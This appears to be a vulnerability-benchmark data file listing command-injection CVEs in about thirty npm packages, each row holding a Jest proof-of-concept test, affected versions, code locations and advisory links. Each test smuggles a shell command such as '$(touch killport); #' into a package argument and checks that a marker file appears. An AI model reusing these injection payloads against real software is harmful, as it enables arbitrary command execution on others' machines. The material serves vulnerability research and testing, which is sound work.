+command-injection,,node-unrar,0.1.0,n/a,command-injection/node-unrar_0.1.0,"test(""Remote code execution in node-unrar"", (done) => {
+  expect.assertions(2);
+  const Unrar = require(""node-unrar"");
+  const fs = require(""fs"");
+  const path = ""./node-unrar"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    var rar = new Unrar(""/path/to/file.rar"");
+    rar._execute([], ""; touch node-unrar;"", function () {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    });
+  } catch (error) {}
+});
+",n/a,lib/index.js:23:3,; 
+command-injection,CVE-2019-15609,kill-port-process,0.0.1,2.2.0,command-injection/kill-port-process_0.0.1,"test(""Command Injection in kill-port-process"", () => {
+  expect.assertions(2);
+  const killPortProcess = require(""kill-port-process"");
+  const fs = require(""fs"");
+  const path = ""./kill-port-process"";
+  const PORT = ""$(touch kill-port-process)"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return killPortProcess(PORT)
+    .then(() => {
+      console.log(""here!"");
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+    })
+    .catch((err) => {})
+    .finally(() => {
+      console.log(""here!!!!"");
+      if (fs.existsSync(path)) {
+        fs.unlinkSync(path);
+        console.log(""File removed!:"", path);
+      }
+    });
+});
+",n/a,src/index.js:44:4,https://security.snyk.io/vuln/SNYK-JS-KILLPORTPROCESS-543829; 
+command-injection,CVE-2020-7632,node-mpv,0.12.2,n/a,command-injection/node-mpv_0.12.2,"test(""Command Injection in node-mpv"", () => {
+  expect.assertions(2);
+  const Root = require(""node-mpv"");
+  const fs = require(""fs"");
+  const path = ""./node-mpv"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var options = { binary: '"" $(touch node-mpv) ""' };
+  try {
+    var root = new Root(options);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/mpv/mpv.js:45:16,https://security.snyk.io/vuln/SNYK-JS-NODEMPV-564426; https://github.com/advisories/GHSA-cqr2-xhg6-p268
+command-injection,CVE-2021-23360,killport,1.0.1,1.0.2,command-injection/killport_1.0.1,"test(""Command Injection in killport"", () => {
+  expect.assertions(2);
+  const killport = require(""killport"");
+  const fs = require(""fs"");
+  const path = ""./killport"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return killport(""$(touch killport); #"").catch(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {});
+  });
+});
+",https://github.com/ssnau/killport/commit/bec8e371f170a12e11cd222ffc7a6e1ae9942638,index.js:9:8,https://security.snyk.io/vuln/SNYK-JS-KILLPORT-1078535; https://github.com/advisories/GHSA-fc42-h7q4-qp8h
+command-injection,CVE-2021-23356,kill-process-by-name,1.0.5,n/a,command-injection/kill-process-by-name_1.0.5,"test(""Command Injection in kill-process-by-name"", (done) => {
+  expect.assertions(2);
+  const kill_process_by_name = require(""kill-process-by-name"");
+  const fs = require(""fs"");
+  const path = ""./kill-process-by-name"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  kill_process_by_name(""$(touch kill-process-by-name)"");
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 500);
+});
+",n/a,index.js:12:18,https://security.snyk.io/vuln/SNYK-JS-KILLPROCESSBYNAME-1078534; https://github.com/advisories/GHSA-qc65-cgvr-93p6
+command-injection,CVE-2021-23376,ffmpegdotjs,0.0.4,n/a,command-injection/ffmpegdotjs_0.0.4,"test(""Command Injection in ffmpegdotjs"", () => {
+  expect.assertions(2);
+  let ffmpegdotjs = require(""ffmpegdotjs"");
+  const fs = require(""fs"");
+  const path = ""./ffmpegdotjs"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return ffmpegdotjs
+    .trimvideo(""package-lock.json"", 0, 30, ""n || touch ffmpegdotjs; #"")
+    .then(() => {})
+    .catch((err) => {})
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,index.js:191:9,https://security.snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542; https://github.com/advisories/GHSA-f39r-cpmj-whcg
+command-injection,,npm-git-publish,0.2.4-beta,n/a,command-injection/npm-git-publish_0.2.4-beta,"test(""Command Injection in npm-git-publish"", () => {
+  expect.assertions(2);
+  const git = require(""npm-git-publish"");
+  const fs = require(""fs"");
+  const path = ""./npm-git-publish"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return git
+    .publish(""."", ""http://gihub.com ;touch npm-git-publish; #"")
+    .catch(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.rmSync(""./gihub.com"", {
+        recursive: true,
+        force: true,
+      });
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,lib/publish.js:92:29,https://security.snyk.io/vuln/SNYK-JS-NPMGITPUBLISH-541508; https://github.com/advisories/GHSA-49mg-94fc-2fx6
+command-injection,CVE-2019-10783,vboxmanage.js,1.0.6,n/a,command-injection/vboxmanage.js_1.0.6,"test(""Command Injection in vboxmanage.js"", () => {
+  expect.assertions(2);
+  const VBox = require(""vboxmanage.js"");
+  const fs = require(""fs"");
+  const path = ""./vboxmanag-js"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return VBox.start("";touch vboxmanag-js;"")
+    .then(function () {})
+    .catch(() => {})
+    .finally(() => {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",https://github.com/danielgindi/node-vboxmanage/commit/8efe421dd19c474cbdeb0908cbcc7aabfe343d5e,index.js:76:23,https://security.snyk.io/vuln/SNYK-JS-VBOXMANAGEJS-607910; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
+command-injection,CVE-2019-10801,enpeem,2.2.0,n/a,command-injection/enpeem_2.2.0,"test(""Command Injection in enpeem"", (done) => {
+  expect.assertions(2);
+  const root = require(""enpeem"");
+  const fs = require(""fs"");
+  const path = ""./enpeem"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let attack_code = ""& touch enpeem &"";
+  let opts = { production: attack_code };
+  root.update(opts, function (err) {
+    console.log(""err!"");
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlinkSync(path);
+    done();
+  });
+});
+",n/a,index.js:71:22,https://security.snyk.io/vuln/SNYK-JS-ENPEEM-559007; https://github.com/advisories/GHSA-hmw2-mvvh-jf5j
+command-injection,CVE-2020-28433,node-latex-pdf,0.0.2,n/a,command-injection/node-latex-pdf_0.0.2,"test(""Command Injection in node-latex-pdf"", (done) => {
+  expect.assertions(2);
+  const a = require(""node-latex-pdf"");
+  const fs = require(""fs"");
+  const path = ""./node-latex-pdf"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""./"", ""& touch node-latex-pdf"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlinkSync(path);
+    done();
+  });
+});
+",n/a,node-latex-pdf.js:10:5,https://security.snyk.io/vuln/SNYK-JS-NODELATEXPDF-1050426; 
+command-injection,CVE-2020-28429,geojson2kml,0.1.1,n/a,command-injection/geojson2kml_0.1.1,"test(""Command Injection in geojson2kml"", (done) => {
+  expect.assertions(2);
+  const a = require(""geojson2kml"");
+  const fs = require(""fs"");
+  const path = ""./geojson2kml"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a(""./"", ""& touch geojson2kml"", function (err) {
+    if (err) throw err;
+    else {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    }
+  });
+});
+",n/a,index.js:6:3,https://security.snyk.io/vuln/SNYK-JS-GEOJSON2KML-1050412; https://github.com/advisories/GHSA-w83x-fp72-p9qc
+command-injection,CVE-2020-7785,node-ps,0.0.2,n/a,command-injection/node-ps_0.0.2,"test(""Command Injection in node-ps"", (done) => {
+  expect.assertions(2);
+  const a = require(""node-ps"");
+  const fs = require(""fs"");
+  const path = ""./node-ps"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a.lookup({ psargs: [""& touch node-ps #""] }, function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/index.js:72:18,https://security.snyk.io/vuln/SNYK-JS-NODEPS-1048335; https://github.com/advisories/GHSA-4rv9-5vc4-88cg
+command-injection,CVE-2018-16462,alfred-workflow-nodejs,2.0.1,2.0.1,command-injection/alfred-workflow-nodejs_2.0.1,"test(""Command Injection in killing"", (done) => {
+  expect.assertions(2);
+  const AlfredNode = require(""alfred-workflow-nodejs"");
+  const fs = require(""fs"");
+  const path = ""./alfred-workflow-nodejs"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var utils = AlfredNode.utils;
+  utils.wfVars.remove(' ""; touch alfred-workflow-nodejs #', function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,alfredNode.js:445:17,https://security.snyk.io/vuln/SNYK-JS-ALFREDWORKFLOWNODEJS-608975; https://github.com/advisories/GHSA-9jm3-5835-537m
+command-injection,CVE-2020-28437,heroku-env,0.2.0,n/a,command-injection/heroku-env_0.2.0,"test(""Command Injection in heroku-env"", (done) => {
+  expect.assertions(2);
+  const root = require(""heroku-env"");
+  const fs = require(""fs"");
+  const path = ""./heroku-env"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  root(""& touch heroku-env"", ""aa"", function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,lib/get.js:3:3,https://security.snyk.io/vuln/SNYK-JS-HEROKUENV-1050432; 
+command-injection,CVE-2021-26275,eslint-fixer,0.1.5,n/a,command-injection/eslint-fixer_0.1.5,"test(""Command Injection in eslint-fixer"", () => {
+  expect.assertions(2);
+  const fix = require(""eslint-fixer"");
+  const fs = require(""fs"");
+  const path = ""./eslint-fixer"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return fix(""$(touch eslint-fixer)"").finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {});
+  });
+});
+",n/a,index.js:24:18,https://security.snyk.io/vuln/SNYK-JS-ESLINTFIXER-1087438; https://github.com/advisories/GHSA-45w5-pvr8-4rh5
+command-injection,CVE-2017-16042,growl,1.9.0,1.10.0,command-injection/growl_1.9.0,"test(""Command Injection in growl"", (done) => {
+  expect.assertions(2);
+  const growl = require(""growl"");
+  const fs = require(""fs"");
+  const path = ""./growl"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  growl(""`touch growl`"", {}, () => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/tj/node-growl/commit/d71177d5331c9de4658aca62e0ac921f178b0669,lib/growl.js:289:3,https://security.snyk.io/vuln/npm:growl:20160721; https://github.com/advisories/GHSA-qh2h-chj9-jffq
+command-injection,CVE-2020-7628,umount,1.1.6,n/a,command-injection/umount_1.1.6,"test(""Command Injection in umount"", (done) => {
+  expect.assertions(2);
+  const root = require(""umount"");
+  const fs = require(""fs"");
+  const path = ""./umount"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let device = '"" $(touch umount) ""';
+  root.umount(device, function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",n/a,build/umount.js:52:24,https://security.snyk.io/vuln/SNYK-JS-UMOUNT-564265; https://github.com/advisories/GHSA-6q48-vjq2-mwcj
+command-injection,CVE-2020-7627,node-key-sender,1.0.11,n/a,command-injection/node-key-sender_1.0.11,"test(""Command Injection in node-key-sender"", () => {
+  expect.assertions(2);
+  const root = require(""node-key-sender"");
+  const fs = require(""fs"");
+  const path = ""./node-key-sender"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let attack_code = [""&touch"", ""node-key-sender""];
+  return root.execute(attack_code).then(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,key-sender.js:117:20,https://security.snyk.io/vuln/SNYK-JS-NODEKEYSENDER-564261; 
+command-injection,CVE-2020-28490,async-git,1.13.1,1.13.2,command-injection/async-git_1.13.1,"test(""Command Injection in async-git"", async () => {
+  expect.assertions(2);
+  const git = require(""async-git"");
+  const fs = require(""fs"");
+  const path = ""./async-git"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    await git.reset(""$(touch async-git)"");
+  } catch (e) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/omrilotan/async-git/commit/d1950a5021f4e19d92f347614be0d85ce991510d,lib/reset/index.js:11:16,https://security.snyk.io/vuln/SNYK-JS-ASYNCGIT-1064877; https://github.com/advisories/GHSA-6qpr-9mc5-7gch
+command-injection,CVE-2018-3785,git-dummy-commit,1.3.0,n/a,command-injection/git-dummy-commit_1.3.0,"test(""Command Injection in git-dummy-commit"", () => {
+  expect.assertions(2);
+  const gitDummyCommit = require(""git-dummy-commit"");
+  const fs = require(""fs"");
+  const path = ""./git-dummy-commit"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  gitDummyCommit('"";touch git-dummy-commit;""');
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,index.js:37:8,https://security.snyk.io/vuln/npm:git-dummy-commit:20180619; https://github.com/advisories/GHSA-h3c2-x77c-7pvr
+command-injection,CVE-2019-10788,strider-git,1.0.3,n/a,command-injection/strider-git_1.0.3,"test(""Command Injection in strider-git"", (done) => {
+  expect.assertions(2);
+  const git = require(""strider-git/lib"");
+  const fs = require(""fs"");
+  const path = ""./strider-git"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  git.getBranches(
+    {
+      auth: {
+        type: ""ssaas;touch strider-git; "",
+        privkey: ""sss"",
+      },
+      url: ""http://sss"",
+    },
+    """",
+    function () {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    }
+  );
+});
+",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,lib/index.js:151:5,https://security.snyk.io/vuln/SNYK-JS-STRIDERGIT-572913; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
+command-injection,CVE-2021-23632,git,0.1.5,n/a,command-injection/git_0.1.5,"test(""Remote code execution in git"", (done) => {
+  expect.assertions(2);
+  const Git = require(""git"").Git;
+  const fs = require(""fs"");
+  const path = ""./git"";
+  let repo = new Git(""repo-test"");
+  let user_input = ""; touch git"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    repo.git(user_input, function (err, result) {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    });
+  } catch (error) {}
+});
+",n/a,lib/git/git.js:232:3,https://security.snyk.io/vuln/SNYK-JS-GIT-1568518; 
+command-injection,CVE-2020-28423,monorepo-build,0.1.9,n/a,command-injection/monorepo-build_0.1.9,"test(""Command Injection in monorepo-build"", (done) => {
+  expect.assertions(2);
+  var a = require(""monorepo-build"");
+  const fs = require(""fs"");
+  const path = ""./monorepo-build"";
+  var execSync = require(""child_process"").execSync;
+  var user_name = """";
+  var user_email = """";
+  try {
+    const cmd = ""git config user.email"";
+    user_email = execSync(cmd).toString().trim();
+  } catch (error) {}
+  try {
+    const cmd = ""git config user.name"";
+    user_name = execSync(cmd).toString().trim();
+  } catch (error) {}
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    a.build(""./"", ""& touch monorepo-build"");
+  } catch (error) {
+    console.log(""syntax-error"");
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {
+    try {
+      const cmd = `git config user.name ""${user_name}""`;
+      execSync(cmd).toString();
+    } catch (error) {
+      console.log(error);
+    }
+    try {
+      const cmd = `git config user.email ""${user_email}""`;
+      execSync(cmd).toString();
+    } catch (error) {
+      console.log(error);
+    }
+    done();
+  });
+});
+",n/a,lib/util/exec.js:4:54,https://security.snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392; 
+command-injection,CVE-2021-23399,wincred,1.0.2,n/a,command-injection/wincred_1.0.2,"test(""Command Injection in wincred"", () => {
+  expect.assertions(2);
+  const wincred = require(""wincred"");
+  const fs = require(""fs"");
+  const path = ""./wincred"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return wincred.getCredential(""|| touch wincred"").finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {});
+  });
+});
+",n/a,index.js:16:17,https://security.snyk.io/vuln/SNYK-JS-WINCRED-1078538; https://github.com/advisories/GHSA-v85c-hgq5-7pfw
+command-injection,CVE-2021-23348,portprocesses,1.0.4,1.0.5,command-injection/portprocesses_1.0.4,"test(""Command Injection in portprocesses"", () => {
+  expect.assertions(2);
+  const portprocesses = require(""portprocesses"");
+  const fs = require(""fs"");
+  const path = ""./portprocesses"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return portprocesses.killProcess(""$(touch portprocesses)"").finally(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {});
+  });
+});
+",https://github.com/rrainn/PortProcesses/commit/86811216c9b97b01b5722f879f8c88a7aa4214e1,exec.js:5:3,https://security.snyk.io/vuln/SNYK-JS-PORTPROCESSES-1078536; https://github.com/advisories/GHSA-vm67-7vmg-66vm
+command-injection,CVE-2021-23379,portkiller,1.0.2,n/a,command-injection/portkiller_1.0.2,"test(""Command Injection in portkiller"", (done) => {
+  expect.assertions(2);
+  const portkiller = require(""portkiller"");
+  const fs = require(""fs"");
+  const path = ""./portkiller"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  let file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  portkiller(""$(touch portkiller)"");
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 500);
+});
+",n/a,index.js:10:5,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078537; https://github.com/advisories/GHSA-r6fw-8m27-43c9
+command-injection,,local-devices,2.0.0,3.0.0,command-injection/local-devices_2.0.0,"test(""Command Injection in local-devices"", () => {
+  expect.assertions(2);
+  const find = require(""local-devices"");
+  const fs = require(""fs"");
+  const path = ""./local-devices"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let userInput = ""127.0.0.1 | touch local-devices"";
+  return find(userInput).then(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,src/index.js:114:13,https://security.snyk.io/vuln/SNYK-JS-LOCALDEVICES-459898; https://github.com/advisories/GHSA-w725-67p7-xv22
+command-injection,,imagickal,5.0.1,n/a,command-injection/imagickal_5.0.1,"test(""Remote code execution in imagickal"", () => {
+  expect.assertions(2);
+  const im = require(""imagickal"");
+  const fs = require(""fs"");
+  const path = ""./imagickal"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  return im
+    .identify("";touch imagickal;"")
+    .catch((err) => {})
+    .finally(() => {
+      console.log(""finally!"");
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {});
+    });
+});
+",n/a,lib/imagickal.js:127:17,https://security.snyk.io/vuln/SNYK-JS-IMAGICKAL-1060040; 
+command-injection,CVE-2021-29300,samsung-remote,1.2.5,1.5.2,command-injection/samsung-remote_1.2.5,"test(""Command Injection in samsung-remote"", (done) => {
+  expect.assertions(2);
+  const SamsungRemote = require(""samsung-remote"");
+  const fs = require(""fs"");
+  const path = ""./samsung-remote"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  var remote = new SamsungRemote({ ip: ""127.0.0.1; touch samsung-remote;"" });
+  remote.isAlive(function (err) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/ronomon/opened/commit/7effe011d4fea8fac7f78c00615e0a6e69af68ec,lib/samsung-remote.js:103:16,https://security.snyk.io/vuln/SNYK-JS-SAMSUNGREMOTE-72278; https://github.com/advisories/GHSA-fg5w-w99f-rj6w
+command-injection,CVE-2019-10787,im-resize,2.3.2,n/a,command-injection/im-resize_2.3.2,"test(""Command Injection in im-resize"", (done) => {
+  expect.assertions(2);
+  const root = require(""im-resize"");
+  const fs = require(""fs"");
+  const path = ""./im-resize"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let image = { path: ""& touch im-resize &"" };
+  let output = { versions: [] };
+  root(image, output, function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/Turistforeningen/node-im-resize/commit/de624dacf6a50e39fe3472af1414d44937ce1f03,index.js:11:3,https://security.snyk.io/vuln/SNYK-JS-IMRESIZE-544183; https://github.com/advisories/GHSA-r9vm-rhmf-7hxx
+command-injection,CVE-2020-28432,theme-core,0.2.5,n/a,command-injection/theme-core_0.2.5,"test(""Command Injection in theme-core"", (done) => {
+  expect.assertions(2);
+  const a = require(""theme-core"");
+  const fs = require(""fs"");
+  const path = ""./theme-core"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  a.utils.sh(""touch theme-core"", true, function () {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+    done();
+  });
+});
+",n/a,lib/utils.js:16:17,https://security.snyk.io/vuln/SNYK-JS-THEMECORE-1050425; 
+command-injection,CVE-2019-10788,im-metadata,3.0.1,n/a,command-injection/im-metadata_3.0.1,"test(""Command Injection in im-metadata"", (done) => {
+  expect.assertions(2);
+  const metadata = require(""im-metadata"");
+  const fs = require(""fs"");
+  const path = ""./im-metadata"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log(""File removed:"", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  metadata(""./foo.jpg;touch im-metadata"", { exif: true }, function (
+    error,
+    metadata
+  ) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
+",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,index.js:15:3,https://security.snyk.io/vuln/SNYK-JS-IMMETADATA-544184; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
+command-injection,CVE-2020-28438,deferred-exec,0.3.1,n/a,command-injection/deferred-exec_0.3.1,"test(""Command Injection in deferred-exec"", async () => {
+  expect.assertions(2);
+  const a = require(""deferred-exec"");
+  const fs = require(""fs"");
+  const path = ""./deferred-exec"";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  await a("" touch deferred-exec "", {});
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/deferred-exec.js:42:19,https://security.snyk.io/vuln/SNYK-JS-DEFERREDEXEC-1050433; 
